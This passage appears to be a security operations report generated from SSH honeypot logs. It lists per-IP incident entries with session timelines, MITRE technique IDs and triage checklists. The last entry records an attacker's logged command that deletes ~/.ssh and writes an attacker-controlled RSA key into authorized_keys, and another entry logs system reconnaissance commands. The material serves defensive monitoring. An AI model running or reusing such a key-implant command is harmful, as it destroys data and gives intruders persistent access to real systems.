| **Last Seen** | 2026-07-13 21:44 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 21:44:49` | `cowrie.session.connect` |
| `2026-07-13 21:44:49` | `cowrie.client.version` |
| `2026-07-13 21:44:49` | `cowrie.client.kex` |
| `2026-07-13 21:44:50` | `cowrie.login.success` |
| `2026-07-13 21:44:50` | `cowrie.direct-tcpip.request` |
| `2026-07-13 21:44:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `37.238.45[.]202` to AbuseIPDB if not already reported
- [ ] Block `37.238.45[.]202` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-569a8f578453

| Field | Detail |
|---|---|
| **Source IP** | `82.102.188[.]117` |
| **First Seen** | 2026-07-13 21:45 |
| **Last Seen** | 2026-07-13 21:45 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 21:45:00` | `cowrie.session.connect` |
| `2026-07-13 21:45:01` | `cowrie.client.version` |
| `2026-07-13 21:45:01` | `cowrie.client.kex` |
| `2026-07-13 21:45:02` | `cowrie.login.success` |
| `2026-07-13 21:45:02` | `cowrie.direct-tcpip.request` |
| `2026-07-13 21:45:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `82.102.188[.]117` to AbuseIPDB if not already reported
- [ ] Block `82.102.188[.]117` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f73469dc712b

| Field | Detail |
|---|---|
| **Source IP** | `183.247.171[.]186` |
| **First Seen** | 2026-07-13 21:48 |
| **Last Seen** | 2026-07-13 21:48 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 21:48:37` | `cowrie.session.connect` |
| `2026-07-13 21:48:39` | `cowrie.client.version` |
| `2026-07-13 21:48:39` | `cowrie.client.kex` |
| `2026-07-13 21:48:41` | `cowrie.login.success` |
| `2026-07-13 21:48:42` | `cowrie.direct-tcpip.request` |
| `2026-07-13 21:48:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.247.171[.]186` to AbuseIPDB if not already reported
- [ ] Block `183.247.171[.]186` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fed1b470928b

| Field | Detail |
|---|---|
| **Source IP** | `211.114.40[.]60` |
| **First Seen** | 2026-07-13 21:48 |
| **Last Seen** | 2026-07-13 21:48 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 21:48:48` | `cowrie.session.connect` |
| `2026-07-13 21:48:49` | `cowrie.client.version` |
| `2026-07-13 21:48:49` | `cowrie.client.kex` |
| `2026-07-13 21:48:52` | `cowrie.login.success` |
| `2026-07-13 21:48:53` | `cowrie.direct-tcpip.request` |
| `2026-07-13 21:48:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.114.40[.]60` to AbuseIPDB if not already reported
- [ ] Block `211.114.40[.]60` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66a220ee8d2d

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-13 21:50 |
| **Last Seen** | 2026-07-13 21:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 21:50:49` | `cowrie.session.connect` |
| `2026-07-13 21:50:49` | `cowrie.client.version` |
| `2026-07-13 21:50:49` | `cowrie.client.kex` |
| `2026-07-13 21:50:49` | `cowrie.login.success` |
| `2026-07-13 21:50:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-146f288f4829

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-13 21:50 |
| **Last Seen** | 2026-07-13 21:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 21:50:50` | `cowrie.session.connect` |
| `2026-07-13 21:50:50` | `cowrie.client.version` |
| `2026-07-13 21:50:50` | `cowrie.client.kex` |
| `2026-07-13 21:50:50` | `cowrie.login.success` |
| `2026-07-13 21:50:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b075785b96dd

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-13 21:50 |
| **Last Seen** | 2026-07-13 21:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 21:50:56` | `cowrie.session.connect` |
| `2026-07-13 21:50:56` | `cowrie.client.version` |
| `2026-07-13 21:50:56` | `cowrie.client.kex` |
| `2026-07-13 21:50:56` | `cowrie.login.success` |
| `2026-07-13 21:50:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bbe022bc4b1d

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-13 21:50 |
| **Last Seen** | 2026-07-13 21:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 21:50:56` | `cowrie.session.connect` |
| `2026-07-13 21:50:56` | `cowrie.client.version` |
| `2026-07-13 21:50:56` | `cowrie.client.kex` |
| `2026-07-13 21:50:56` | `cowrie.login.success` |
| `2026-07-13 21:50:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a030e1622e2

| Field | Detail |
|---|---|
| **Source IP** | `196.28.226[.]124` |
| **First Seen** | 2026-07-13 21:52 |
| **Last Seen** | 2026-07-13 21:52 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 21:52:22` | `cowrie.session.connect` |
| `2026-07-13 21:52:23` | `cowrie.client.version` |
| `2026-07-13 21:52:23` | `cowrie.client.kex` |
| `2026-07-13 21:52:26` | `cowrie.login.success` |
| `2026-07-13 21:52:26` | `cowrie.direct-tcpip.request` |
| `2026-07-13 21:52:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.28.226[.]124` to AbuseIPDB if not already reported
- [ ] Block `196.28.226[.]124` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a29bbc598a74

| Field | Detail |
|---|---|
| **Source IP** | `67.85.146[.]216` |
| **First Seen** | 2026-07-13 21:52 |
| **Last Seen** | 2026-07-13 21:52 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 21:52:37` | `cowrie.session.connect` |
| `2026-07-13 21:52:37` | `cowrie.client.version` |
| `2026-07-13 21:52:37` | `cowrie.client.kex` |
| `2026-07-13 21:52:38` | `cowrie.login.success` |
| `2026-07-13 21:52:38` | `cowrie.direct-tcpip.request` |
| `2026-07-13 21:52:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `67.85.146[.]216` to AbuseIPDB if not already reported
- [ ] Block `67.85.146[.]216` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3203055d74a2

| Field | Detail |
|---|---|
| **Source IP** | `122.254.30[.]34` |
| **First Seen** | 2026-07-13 21:56 |
| **Last Seen** | 2026-07-13 21:56 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 21:56:00` | `cowrie.session.connect` |
| `2026-07-13 21:56:01` | `cowrie.client.version` |
| `2026-07-13 21:56:01` | `cowrie.client.kex` |
| `2026-07-13 21:56:04` | `cowrie.login.success` |
| `2026-07-13 21:56:05` | `cowrie.direct-tcpip.request` |
| `2026-07-13 21:56:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.254.30[.]34` to AbuseIPDB if not already reported
- [ ] Block `122.254.30[.]34` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f11f3d7aad5

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-13 21:58 |
| **Last Seen** | 2026-07-13 21:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 21:58:32` | `cowrie.session.connect` |
| `2026-07-13 21:58:32` | `cowrie.client.version` |
| `2026-07-13 21:58:32` | `cowrie.client.kex` |
| `2026-07-13 21:58:33` | `cowrie.login.success` |
| `2026-07-13 21:58:34` | `cowrie.session.params` |
| `2026-07-13 21:58:34` | `cowrie.command.input` |
| `2026-07-13 21:58:35` | `cowrie.log.closed` |
| `2026-07-13 21:58:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-197b438b180e

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-13 22:01 |
| **Last Seen** | 2026-07-13 22:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 22:01:59` | `cowrie.session.connect` |
| `2026-07-13 22:01:59` | `cowrie.client.version` |
| `2026-07-13 22:01:59` | `cowrie.client.kex` |
| `2026-07-13 22:01:59` | `cowrie.login.success` |
| `2026-07-13 22:02:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f071b873b96

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-13 22:01 |
| **Last Seen** | 2026-07-13 22:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 22:01:59` | `cowrie.session.connect` |
| `2026-07-13 22:01:59` | `cowrie.client.version` |
| `2026-07-13 22:01:59` | `cowrie.client.kex` |
| `2026-07-13 22:01:59` | `cowrie.login.success` |
| `2026-07-13 22:02:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55386373e74f

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-13 22:02 |
| **Last Seen** | 2026-07-13 22:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 22:02:08` | `cowrie.session.connect` |
| `2026-07-13 22:02:08` | `cowrie.client.version` |
| `2026-07-13 22:02:08` | `cowrie.client.kex` |
| `2026-07-13 22:02:09` | `cowrie.login.success` |
| `2026-07-13 22:02:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d08cc74a11fd

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-13 22:02 |
| **Last Seen** | 2026-07-13 22:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 22:02:09` | `cowrie.session.connect` |
| `2026-07-13 22:02:09` | `cowrie.client.version` |
| `2026-07-13 22:02:09` | `cowrie.client.kex` |
| `2026-07-13 22:02:10` | `cowrie.login.success` |
| `2026-07-13 22:02:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-334dcbeb3a4a

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-13 22:10 |
| **Last Seen** | 2026-07-13 22:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 22:10:45` | `cowrie.session.connect` |
| `2026-07-13 22:10:45` | `cowrie.client.version` |
| `2026-07-13 22:10:45` | `cowrie.client.kex` |
| `2026-07-13 22:10:45` | `cowrie.login.success` |
| `2026-07-13 22:10:45` | `cowrie.direct-tcpip.request` |
| `2026-07-13 22:10:45` | `cowrie.direct-tcpip.data` |
| `2026-07-13 22:10:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ed293a34c38

| Field | Detail |
|---|---|
| **Source IP** | `65.20.187[.]47` |
| **First Seen** | 2026-07-13 22:11 |
| **Last Seen** | 2026-07-13 22:11 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 22:11:16` | `cowrie.session.connect` |
| `2026-07-13 22:11:17` | `cowrie.client.version` |
| `2026-07-13 22:11:18` | `cowrie.client.kex` |
| `2026-07-13 22:11:20` | `cowrie.login.success` |
| `2026-07-13 22:11:20` | `cowrie.direct-tcpip.request` |
| `2026-07-13 22:11:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.187[.]47` to AbuseIPDB if not already reported
- [ ] Block `65.20.187[.]47` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6bb332d3944a

| Field | Detail |
|---|---|
| **Source IP** | `182.60.128[.]241` |
| **First Seen** | 2026-07-13 22:11 |
| **Last Seen** | 2026-07-13 22:11 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 22:11:25` | `cowrie.session.connect` |
| `2026-07-13 22:11:26` | `cowrie.client.version` |
| `2026-07-13 22:11:26` | `cowrie.client.kex` |
| `2026-07-13 22:11:28` | `cowrie.login.success` |
| `2026-07-13 22:11:29` | `cowrie.direct-tcpip.request` |
| `2026-07-13 22:11:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.60.128[.]241` to AbuseIPDB if not already reported
- [ ] Block `182.60.128[.]241` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07a7663fc5f2

| Field | Detail |
|---|---|
| **Source IP** | `104.225.250[.]214` |
| **First Seen** | 2026-07-13 22:13 |
| **Last Seen** | 2026-07-13 22:14 |
| **Session Duration** | 59s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/ip cloud print, ifconfig, uname -a, cat /proc/cpuinfo, ps | grep '[Mm]iner'` |
| **TTPs (MITRE)** | T1057 · T1078 · T1083 · T1110.001 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 22:13:31` | `cowrie.session.connect` |
| `2026-07-13 22:13:31` | `cowrie.client.version` |
| `2026-07-13 22:13:31` | `cowrie.client.kex` |
| `2026-07-13 22:13:32` | `cowrie.login.failed` |
| `2026-07-13 22:13:33` | `cowrie.login.success` |
| `2026-07-13 22:13:34` | `cowrie.session.params` |
| `2026-07-13 22:13:34` | `cowrie.command.input` |
| `2026-07-13 22:13:34` | `cowrie.command.failed` |
| `2026-07-13 22:13:34` | `cowrie.log.closed` |
| `2026-07-13 22:13:35` | `cowrie.session.params` |
| `2026-07-13 22:13:35` | `cowrie.command.input` |
| `2026-07-13 22:13:35` | `cowrie.log.closed` |
| `2026-07-13 22:13:36` | `cowrie.session.params` |
| `2026-07-13 22:13:36` | `cowrie.command.input` |
| `2026-07-13 22:13:36` | `cowrie.log.closed` |
| `2026-07-13 22:13:36` | `cowrie.session.params` |
| `2026-07-13 22:13:36` | `cowrie.command.input` |
| `2026-07-13 22:13:37` | `cowrie.log.closed` |
| `2026-07-13 22:13:37` | `cowrie.session.params` |
| `2026-07-13 22:13:37` | `cowrie.command.input` |
| `2026-07-13 22:13:37` | `cowrie.log.closed` |
| `2026-07-13 22:13:38` | `cowrie.session.params` |
| `2026-07-13 22:13:38` | `cowrie.command.input` |
| `2026-07-13 22:13:38` | `cowrie.log.closed` |
| `2026-07-13 22:13:39` | `cowrie.session.params` |
| `2026-07-13 22:13:39` | `cowrie.command.input` |
| `2026-07-13 22:13:39` | `cowrie.log.closed` |
| `2026-07-13 22:13:40` | `cowrie.session.params` |
| `2026-07-13 22:13:40` | `cowrie.command.input` |
| `2026-07-13 22:13:40` | `cowrie.log.closed` |
| `2026-07-13 22:13:40` | `cowrie.session.params` |
| `2026-07-13 22:13:40` | `cowrie.command.input` |
| `2026-07-13 22:13:41` | `cowrie.log.closed` |
| `2026-07-13 22:14:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.225.250[.]214` to AbuseIPDB if not already reported
- [ ] Block `104.225.250[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7e1c4877255

| Field | Detail |
|---|---|
| **Source IP** | `223.197.153[.]138` |
| **First Seen** | 2026-07-13 22:14 |
| **Last Seen** | 2026-07-13 22:14 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 22:14:35` | `cowrie.session.connect` |
| `2026-07-13 22:14:36` | `cowrie.client.version` |
| `2026-07-13 22:14:36` | `cowrie.client.kex` |
| `2026-07-13 22:14:38` | `cowrie.login.success` |
| `2026-07-13 22:14:39` | `cowrie.direct-tcpip.request` |
| `2026-07-13 22:14:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.197.153[.]138` to AbuseIPDB if not already reported
- [ ] Block `223.197.153[.]138` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8fe80cb7ed1f

| Field | Detail |
|---|---|
| **Source IP** | `36.39.140[.]2` |
| **First Seen** | 2026-07-13 22:14 |
| **Last Seen** | 2026-07-13 22:15 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 22:14:51` | `cowrie.session.connect` |
| `2026-07-13 22:14:52` | `cowrie.client.version` |
| `2026-07-13 22:14:52` | `cowrie.client.kex` |
| `2026-07-13 22:14:54` | `cowrie.login.success` |
| `2026-07-13 22:14:55` | `cowrie.direct-tcpip.request` |
| `2026-07-13 22:15:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.39.140[.]2` to AbuseIPDB if not already reported
- [ ] Block `36.39.140[.]2` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dbd683366e15

| Field | Detail |
|---|---|
| **Source IP** | `65.20.163[.]103` |
| **First Seen** | 2026-07-13 22:18 |
| **Last Seen** | 2026-07-13 22:18 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 22:18:00` | `cowrie.session.connect` |
| `2026-07-13 22:18:00` | `cowrie.client.version` |
| `2026-07-13 22:18:00` | `cowrie.client.kex` |
| `2026-07-13 22:18:02` | `cowrie.login.success` |
| `2026-07-13 22:18:02` | `cowrie.direct-tcpip.request` |
| `2026-07-13 22:18:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.163[.]103` to AbuseIPDB if not already reported
- [ ] Block `65.20.163[.]103` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f737a4bdee8

| Field | Detail |
|---|---|
| **Source IP** | `211.178.165[.]251` |
| **First Seen** | 2026-07-13 22:18 |
| **Last Seen** | 2026-07-13 22:18 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 22:18:24` | `cowrie.session.connect` |
| `2026-07-13 22:18:25` | `cowrie.client.version` |
| `2026-07-13 22:18:25` | `cowrie.client.kex` |
| `2026-07-13 22:18:27` | `cowrie.login.success` |
| `2026-07-13 22:18:27` | `cowrie.direct-tcpip.request` |
| `2026-07-13 22:18:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.178.165[.]251` to AbuseIPDB if not already reported
- [ ] Block `211.178.165[.]251` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4f91e2b5af4

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-13 22:20 |
| **Last Seen** | 2026-07-13 22:20 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 22:20:01` | `cowrie.session.connect` |
| `2026-07-13 22:20:02` | `cowrie.client.version` |
| `2026-07-13 22:20:02` | `cowrie.client.kex` |
| `2026-07-13 22:20:04` | `cowrie.login.success` |
| `2026-07-13 22:20:06` | `cowrie.session.params` |
| `2026-07-13 22:20:06` | `cowrie.command.input` |
| `2026-07-13 22:20:06` | `cowrie.log.closed` |
| `2026-07-13 22:20:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef3ce242d1b3

| Field | Detail |
|---|---|
| **Source IP** | `189.146.59[.]77` |
| **First Seen** | 2026-07-13 22:21 |
| **Last Seen** | 2026-07-13 22:21 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
